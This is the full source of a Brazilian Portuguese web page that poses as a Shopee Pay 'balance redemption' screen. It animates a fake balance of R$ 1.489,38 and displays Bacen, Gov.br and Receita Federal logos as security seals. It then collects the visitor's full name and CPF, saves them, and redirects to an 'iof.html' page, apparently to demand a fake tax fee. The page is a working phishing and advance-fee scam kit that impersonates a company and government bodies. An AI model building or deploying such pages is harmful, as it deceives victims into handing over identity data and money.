<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Resgate de Saldo</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(180deg, #ee4d2d 0%, #f5f5f5 35%);
            margin: 0; padding: 0;
            color: #333;
            min-height: 100vh;
        }

        /* --- TELA 1: SALDO --- */
        .header-section { padding: 30px 20px 40px 20px; color: white; position: relative; }
        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
        
        /* Moeda Dourada Realista */
        .coin-icon { width: 45px; height: 45px; filter: drop-shadow(0 3px 6px rgba(0,0,0,0.2)); }
        
        .card-white {
            background: white;
            margin: 0 15px 15px 15px;
            padding: 22px;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
            position: relative;
        }

        /* OpÃ§Ãµes de Valor */
        .option-group { display: flex; gap: 10px; margin: 15px 0; }
        .option-btn {
            border: 1px solid #f0f0f0; background: #f9f9f9;
            padding: 12px 0; border-radius: 6px;
            text-align: center; font-weight: 700; font-size: 14px;
            flex: 1; color: #555; transition: 0.2s;
        }
        .big-option {
            width: 100%; padding: 22px 0;
            font-size: 26px; font-weight: 900;
            margin: 10px 0 20px 0;
            border: 1px solid #f0f0f0; border-radius: 8px;
            text-align: center; background: #f9f9f9; cursor: pointer;
        }
        .selected { border: 2px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; }

        /* BotÃ£o Sacar */
        .btn-main {
            background: #ee4d2d; color: white;
            width: 100%; padding: 18px;
            border: none; border-radius: 8px;
            font-size: 16px; font-weight: 800;
            cursor: pointer; text-transform: uppercase;
            box-shadow: 0 4px 10px rgba(238, 77, 45, 0.2);
        }
        .btn-disabled { background: #e0e0e0; color: #aaa; cursor: not-allowed; box-shadow: none; }

        /* Selos de SeguranÃ§a */
        .security-footer {
            display: flex; justify-content: space-around; align-items: center;
            margin-top: 25px; padding-top: 15px;
            border-top: 1px solid #f0f0f0;
            filter: grayscale(100%); opacity: 0.6;
        }
        .security-img { height: 28px; width: auto; }

        /* Modal */
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 100; display: flex; align-items: flex-end; }
        .modal-sheet { background: white; width: 100%; border-radius: 20px 20px 0 0; padding: 30px 25px; animation: slideUp 0.3s; }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .hidden { display: none !important; }

        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; background: #f9f9f9; }
    </style>
</head>
<body>

    <div id="step-1">
        <div class="header-section">
            <div class="header-top">
                <span style="font-size: 14px; font-weight: 500; opacity: 0.9;">Saldo disponÃ­vel para resgate</span>
                <div class="coin-icon">
                    <svg viewBox="0 0 512 512"><circle cx="256" cy="256" r="248" fill="#ffd700" stroke="#daa520" stroke-width="8"/><circle cx="256" cy="256" r="200" fill="none" stroke="#daa520" stroke-width="8" stroke-dasharray="20,10"/><text x="50%" y="65%" text-anchor="middle" fill="#daa520" font-family="Arial" font-weight="bold" font-size="250">$</text></svg>
                </div>
            </div>
            <div style="font-size: 44px; font-weight: 900; letter-spacing: -1px;">R$ <span id="balance">0,00</span></div>
            <div style="font-size: 13px; opacity: 0.8; margin-top: 4px;">= <span id="points">0,00</span> pontos (s)</div>
        </div>

        <div class="card-white" style="margin-top: -25px; z-index: 10;">
            <h3 style="margin: 0 0 15px 0; font-size: 17px;">Sacar agora</h3>
            
            <div style="display:flex; align-items:center; gap:8px; margin-bottom:15px; font-size:14px; color:#555;">
                <span style="font-size: 18px;">ðŸ’³</span> TransferÃªncia via <strong style="color:#2c9e94;">Pix</strong>
            </div>

            <div class="option-group">
                <div class="option-btn" onclick="selectOpt(this)">R$1,5</div>
                <div class="option-btn" onclick="selectOpt(this)">R$5</div>
                <div class="option-btn" onclick="selectOpt(this)">R$10</div>
            </div>

            <div id="big-opt" class="big-option" onclick="selectBig()">
                R$ 1.489,38
            </div>

            <button id="btn-sacar" class="btn-main btn-disabled" onclick="openModal()">
                SACAR DINHEIRO
            </button>

            <div class="security-footer">
                <img src="https://logodownload.org/wp-content/uploads/2017/08/bacen-logo.png" class="security-img" alt="Bacen">
                <img src="https://www.gov.br/++theme++br.gov.tema/images/logo-govbr.png" class="security-img" alt="Gov.br">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg/1024px-Receita_Federal_do_Brasil_-_2022_logo.svg.png" class="security-img" alt="Receita">
            </div>
        </div>
    </div>

    <div id="modal-pix" class="modal-overlay hidden">
        <div class="modal-sheet">
            <h2 style="text-align:center; font-size:18px; margin-bottom:25px;">Vincular Chave PIX</h2>
            <input type="text" id="nome" placeholder="Nome completo do titular">
            <input type="tel" id="cpf" placeholder="CPF (Apenas nÃºmeros)" maxlength="14">
            <button class="btn-main" onclick="irParaTaxa()">CONFIRMAR E CONTINUAR</button>
            <p style="text-align:center; font-size:11px; color:#aaa; margin-top:20px;">ðŸ”’ TransaÃ§Ã£o criptografada Shopee Pay</p>
        </div>
    </div>

    <script>
        // --- 1. CONTADOR ANIMADO ---
        function animateNumber(id, target, duration) {
            let start = 0;
            const element = document.getElementById(id);
            const startTime = performance.now();

            function update(currentTime) {
                const elapsed = currentTime - startTime;
                const progress = Math.min(elapsed / duration, 1);
                const current = progress * target;
                
                element.innerText = current.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

                if (progress < 1) requestAnimationFrame(update);
            }
            requestAnimationFrame(update);
        }

        window.onload = () => {
            animateNumber('balance', 1489.38, 1200); // Carrega em 1.2s
            animateNumber('points', 42583.05, 1200);
        };

        // --- 2. LOGICA SELEÃ‡ÃƒO ---
        let selecionado = false;
        function selectOpt(el) {
            document.querySelectorAll('.option-btn, .big-option').forEach(b => b.classList.remove('selected'));
            el.classList.add('selected');
            ativarBotao();
        }
        function selectBig() {
            document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
            document.getElementById('big-opt').classList.add('selected');
            ativarBotao();
        }
        function ativarBotao() {
            const btn = document.getElementById('btn-sacar');
            btn.classList.remove('btn-disabled');
            btn.innerText = "SACAR AGORA";
            selecionado = true;
        }

        function openModal() {
            if(!selecionado) return alert("Selecione um valor.");
            document.getElementById('modal-pix').classList.remove('hidden');
        }

        // --- 3. MÃSCARA E REDIRECIONAMENTO ---
        document.getElementById('cpf').addEventListener('input', e => {
            let v = e.target.value.replace(/\D/g,"");
            v = v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2");
            e.target.value = v;
        });

        function irParaTaxa() {
            const nome = document.getElementById('nome').value;
            const cpf = document.getElementById('cpf').value;
            if(nome.length < 5 || cpf.length < 14) return alert("Preencha os dados corretamente.");
            
            // Salva os dados para usar na proxima pagina (IOF)
            localStorage.setItem('user_nome', nome);
            localStorage.setItem('user_cpf', cpf);
            
            window.location.href = 'iof.html'; // Vai para a pÃ¡gina da Receita
        }
    </script>
</body>
</html>